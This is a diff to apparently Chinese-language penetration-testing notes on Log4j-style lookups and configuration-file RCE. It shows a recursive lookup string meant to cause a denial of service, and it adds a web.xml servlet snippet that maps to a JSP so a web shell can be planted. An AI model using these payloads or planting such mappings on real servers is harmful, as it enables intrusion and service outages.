@@ -201,6 +201,20 @@ https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&mid=2247490570&idx=1&sn=279f4c
 在配置文件中配置：${ctx:apiVersion}   则输入${${::-${::-$${::-dos}}}}则可以造成递归dos
 ```
 
+## 更新
+
+[聊聊配置文件 RCE 这件事](https://mp.weixin.qq.com/s?__biz=Mzg4MzYxODA4Mw==&mid=2247484028&idx=1&sn=5748c6b75530a786f1bf0622616413c6&chksm=cf45fa30f83273269da4884f82c5d4ce43089d6ba8a7b6470e35f963d690ec781faa85ab48e1&mpshare=1&scene=23&srcid=12298p7j6KLY39FVuwNzmFRD&sharer_sharetime=1640749370687&sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd)
+
+不愧是师傅总结的不错，简单的说就是通过配置文件去rce.
+突然又想到了一个：web.xml里面添加servlet去实现解析一句话。
+```xml
+<servlet>
+<servlet-name>xxx</servlet-name>
+<jsp-file>/WEB-INF/1.jsp</jsp-file>
+</servlet>
+```
+
+
 ## 总结一下
 
 主要是自己的问题，
